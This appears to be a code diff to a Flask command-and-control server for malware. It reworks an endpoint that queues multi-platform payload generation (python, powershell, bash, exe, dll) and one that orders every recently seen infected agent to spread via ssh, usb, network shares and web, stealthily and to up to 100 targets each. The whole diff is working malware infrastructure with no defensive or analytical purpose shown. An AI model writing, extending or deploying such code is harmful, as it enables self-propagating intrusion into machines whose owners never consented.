@@ -7563,23 +7563,40 @@ def payloads_generate():
         data = request.get_json(silent=True) or {}
         payload_type = data.get("type", "all")
         
+        # Get first agent for system tasks
+        first_agent = db.execute("SELECT id FROM agents LIMIT 1").fetchone()
+        agent_id = first_agent["id"] if first_agent else None
+        
         # Create payload generation tasks
         task_ids = []
         platforms = ["windows", "linux", "macos"]
+        payload_types = ["python", "powershell", "bash", "exe", "dll"]
         
+        import uuid
         for platform in platforms:
-            result = db.execute("""
-                INSERT INTO tasks (agent_id, task_type, payload, status, created_at)
-                VALUES ('system', 'generate_payload', ?, 'pending', datetime('now'))
-            """, (json.dumps({"platform": platform, "type": payload_type}),))
-            task_ids.append(result.lastrowid)
+            for ptype in payload_types:
+                task_id = f"payload-{uuid.uuid4().hex[:8]}"
+                db.execute("""
+                    INSERT INTO tasks (id, agent_id, task_type, payload, status, created_at)
+                    VALUES (?, ?, 'generate_payload', ?, 'pending', datetime('now'))
+                """, (task_id, agent_id, json.dumps({"platform": platform, "type": ptype})))
+                task_ids.append(task_id)
         
         db.commit()
+        
+        # Emit detailed event
+        socketio.emit("payloads_generating", {
+            "count": len(task_ids),
+            "platforms": platforms,
+            "types": payload_types
+        })
         
         return jsonify({
             "status": "ok",
             "payloads_created": len(task_ids),
-            "task_ids": task_ids
+            "task_ids": task_ids,
+            "platforms": platforms,
+            "types": payload_types
         })
     except Exception as e:
         return jsonify({"status": "error", "error": str(e)}), 500
@@ -8447,38 +8464,40 @@ def start_propagation():
         
         # Get all online agents
         agents = db.execute("""
-            SELECT id, agent_id FROM agents 
-            WHERE last_seen > datetime('now', '-10 minutes')
+            SELECT id FROM agents 
+            WHERE is_alive = 1 OR last_seen > datetime('now', '-1 hour')
         """).fetchall()
         
         tasked = 0
+        task_ids = []
         for agent in agents:
             # Create propagation task
-            db.execute("""
+            result = db.execute("""
                 INSERT INTO tasks (agent_id, task_type, payload, status, created_at)
                 VALUES (?, 'propagate', ?, 'pending', datetime('now'))
             """, (
-                agent["agent_id"],
+                agent["id"],
                 json.dumps({
                     "methods": ["ssh", "usb", "network_shares", "web"],
                     "max_targets": 100,
                     "stealth": True
                 })
             ))
+            task_ids.append(result.lastrowid)
             tasked += 1
         
         db.commit()
         
-        socketio.emit("operation_log", {
-            "level": "success",
-            "message": f"🦠 Propagation started: {tasked} agents tasked",
-            "source": "propagation"
+        socketio.emit("propagation_started", {
+            "agents": tasked,
+            "task_ids": task_ids,
+            "methods": ["ssh", "usb", "network_shares", "web"]
         })
         
         return jsonify({
             "status": "ok",
-            "agents_tasked": tasked,
-            "message": f"Propagation tasks created for {tasked} agents"
+            "agents_targeted": tasked,
+            "task_ids": task_ids
         })
     except Exception as e:
         return jsonify({"status": "error", "error": str(e)}), 500
